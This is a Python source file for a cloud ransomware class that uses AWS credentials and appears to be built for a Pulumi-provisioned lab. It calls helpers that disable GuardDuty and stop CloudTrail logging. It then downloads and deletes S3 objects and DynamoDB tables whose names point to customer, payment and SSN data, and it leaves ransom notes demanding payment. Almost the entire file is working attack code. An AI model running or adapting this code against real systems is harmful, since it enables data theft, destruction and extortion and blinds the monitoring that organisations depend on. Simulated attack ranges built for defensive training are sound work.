import boto3
import json
import os
import time
from DisableGD_CT import disable_guardduty, stop_cloudtrail_logging
from Load_Pulumi_Outputs import get_pulumi_output

class Ransomware:
    """Handles AWS session initialization and attack modules for S3 and DynamoDB"""

    def __init__(self, access_key, secret_key, region='us-east-1'):


        # Ensure AWS picks up only the new credentials by deleting
        # any previous sessions in the global python runtime, 
        # this is cruicial for transferring sessions to expand
        # to other users in multi-user encompassing attack vectors
        boto3.setup_default_session()

        # AWS IAM propagation delay
        print(" Waiting for IAM propagation...")
        time.sleep(5)  # Add a delay before using new credentials


        """Initialize a boto3 session with given credentials"""
        # This is the newly created user for ransomware that got admin 
        # privileges attached to it for s3 & dynamodb
        self.session = boto3.Session(
            aws_access_key_id=access_key,
            aws_secret_access_key=secret_key,
            region_name=region
        )
        
        # Initialize attack modules for variable reference in Ransomware class imports
        self.s3_drain = self.S3_Drain_Delete(self.session)
        self.dynamodb_drain = self.DynamoDB_Drain_Delete(self.session)


        # Dynamically fetching GuardDuty and CloudTrail details from Pulumi outputs
        self.guardduty_id = get_pulumi_output("gd_detector_id")  
        self.cloudtrail_name = get_pulumi_output("cloudtrail_name") 


    def session_test(self):
        """Test the AWS session by getting caller identity"""
        try:
            sts_client = self.session.client("sts")
            identity = sts_client.get_caller_identity()
            print(f" Confirmed AWS Identity: {identity['Arn']}")
            return True
        except Exception as e:
            print(f" ERROR: Invalid session credentials: {e}")
            return False

    def disable_guardduty(self):
        """Executes GuardDuty disable and CloudTrail logging stop"""
        disable_guardduty(self.session, self.guardduty_id)

    def stop_cloudtrail_logging(self):
        """Executes GuardDuty disable and CloudTrail logging stop"""
        stop_cloudtrail_logging(self.session, self.cloudtrail_name)
    

    
    class S3_Drain_Delete:
        def __init__(self, session):
            """Initialize S3 client and target S3 buckets"""
            self.s3_client = session.client('s3')
            self.target_buckets = self.get_target_s3_buckets()

        def get_target_s3_buckets(self):
            """Fetch all S3 buckets & filter by predefined naming patterns"""
            all_buckets = self.s3_client.list_buckets().get('Buckets', [])

            # Convert Pulumi bucket names to lowercase for comparison
            s3_target_patterns = [
                "company-data-q1-2024", "company-data-q2-2024",
                "company-data-q3-2024", "company-data-q4-2024",
                "configuration-files", "customer-data", "payment-data"
            ]

            target_buckets = [
                bucket['Name'] for bucket in all_buckets
                if any(bucket['Name'].lower().startswith(pattern) for pattern in s3_target_patterns)
            ]

            print("Target S3 Buckets:", target_buckets)
            return target_buckets


        def search_and_exfiltrate(self, exfiltration_path="./s3_Exfiltration"):
            """Downloads all objects from targeted buckets, deletes them, and leaves a ransom note"""
            os.makedirs(exfiltration_path, exist_ok=True)
            for bucket in self.target_buckets:
                objects = self.s3_client.list_objects_v2(Bucket=bucket).get('Contents', [])
                for obj in objects:
                    key = obj['Key']
                    file_path = os.path.join(exfiltration_path, f"{bucket}_{key.replace('/', '_')}.json")
                    self.s3_client.download_file(bucket, key, file_path)
                    print(f"Downloaded: {key} from {bucket}")
                    self.s3_client.delete_object(Bucket=bucket, Key=key)
                    print(f"Deleted: {key} from {bucket}")
                ransom_note = "Your data has been taken. Pay or it’s gone forever."
                self.s3_client.put_object(Bucket=bucket, Key="too_late.txt", Body=ransom_note)
                print(f"Ransom note placed in {bucket}")

    class DynamoDB_Drain_Delete:
        def __init__(self, session):
            """Initialize DynamoDB client and target tables"""
            self.dynamodb_client = session.client('dynamodb')
            self.dynamodb_resource = session.resource('dynamodb')
            self.target_tables = self.get_target_dynamodb_tables()

        def get_target_dynamodb_tables(self):
            """Fetch all DynamoDB tables & filter by predefined naming patterns"""
            all_tables = self.dynamodb_client.list_tables().get('TableNames', [])
            dynamodb_target_patterns = ["CustomerOrdersTable", "CustomerSSNTable"]
            target_tables = [table for table in all_tables if any(pattern in table for pattern in dynamodb_target_patterns)]
            return target_tables

        def search_and_exfiltrate(self, exfiltration_path="./DynamoDB_Exfiltration"):
            """Downloads all content from targeted tables, deletes them, and leaves a ransom note"""
            os.makedirs(exfiltration_path, exist_ok=True)
            for table_name in self.target_tables:
                table = self.dynamodb_resource.Table(table_name)
                scan_response = table.scan()
                data = scan_response.get('Items', [])
                if data:
                    file_path = os.path.join(exfiltration_path, f"{table_name}.json")
                    with open(file_path, 'w') as f:
                        json.dump(data, f, indent=4)
                    print(f"Extracted data from {table_name} to {file_path}")
                self.dynamodb_client.delete_table(TableName=table_name)
                print(f"Deleted table {table_name}")
                ransom_note = {"Message": "Your database is gone. Pay to get it back."}
                note_path = os.path.join(exfiltration_path, f"{table_name}_RANSOM_NOTE.json")
                with open(note_path, 'w') as f:
                    json.dump(ransom_note, f, indent=4)
                print(f"Ransom note left in {exfiltration_path} for {table_name}")